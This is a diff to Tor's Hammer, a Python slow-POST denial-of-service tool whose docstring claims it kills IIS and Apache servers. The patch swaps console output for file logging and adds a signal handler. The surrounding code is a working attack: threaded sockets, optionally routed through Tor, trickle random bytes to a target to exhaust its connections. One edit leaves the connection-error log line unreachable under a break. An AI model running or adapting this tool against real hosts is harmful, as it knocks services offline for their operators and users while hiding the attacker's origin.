@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python2
 
 """
 Tor's Hammer - Slow POST Denial Of Service Testing Tool
@@ -14,11 +14,13 @@ Kills newer IIS and Apache 2.X with ~256 threads.
 """
 
 import getopt
+import logging
 import random
-import traceback as tb
+import signal
 import string
 import sys
 import time
+import traceback as tb
 from threading import Thread
 
 import socks
@@ -53,6 +55,25 @@ useragents = [
     "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 ]
 
+logging.basicConfig(filename="logs/t.log", level=logging.DEBUG,
+                    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
+
+
+def stop(signum, stack):
+    """
+        stop
+    """
+    logging.info("receive signal:%s" % signum)
+    global stop_now
+    global rthreads
+    for t in rthreads:
+        logging.info("stop torshammer")
+        stop_now = True
+        t.running = False
+
+
+signal.signal(signal.SIGTERM, stop)
+
 
 class httpPost(Thread):
     def __init__(self, host, port, tor):
@@ -79,8 +100,9 @@ class httpPost(Thread):
             if stop_now:
                 self.running = False
                 break
+
             p = random.choice(string.letters + string.digits)
-            print(term.BOL + term.UP + term.CLEAR_EOL + "Posting: %s" % p + term.NORMAL)
+            logging.debug("Posting: %s" % p)
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
 
@@ -93,13 +115,13 @@ class httpPost(Thread):
                     if self.tor:
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print(term.BOL + term.UP + term.CLEAR_EOL + "Connected to host..." + term.NORMAL)
+                    logging.debug("Connected to host...")
                     break
                 except Exception as e:
-                    print(tb.format_exc())
+                    logging.debug(tb.format_exc())
                     if e.args[0] == 106 or e.args[0] == 60:
                         break
-                    print(term.BOL + term.UP + term.CLEAR_EOL + "Error connecting to host..." + term.NORMAL)
+                        logging.debug("Error connecting to host...")
                     time.sleep(1)
                     continue
 
@@ -108,7 +130,7 @@ class httpPost(Thread):
                     self._send_http_post()
                 except Exception as e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print(term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL)
+                        logging.debug("Thread broken, restarting...")
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
@@ -124,8 +146,8 @@ def usage():
     print(" -h|--help Shows this help\n")
     print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
-def main(argv):
 
+def main(argv):
     try:
         opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
     except getopt.GetoptError:
@@ -188,7 +210,7 @@ if __name__ == "__main__":
     try:
         main(sys.argv[1:])
     except KeyboardInterrupt:
-        print("\nShutting down threads...\n")
+        logging.info("Shutting down threads...\n")
         for t in rthreads:
             stop_now = True
             t.running = False
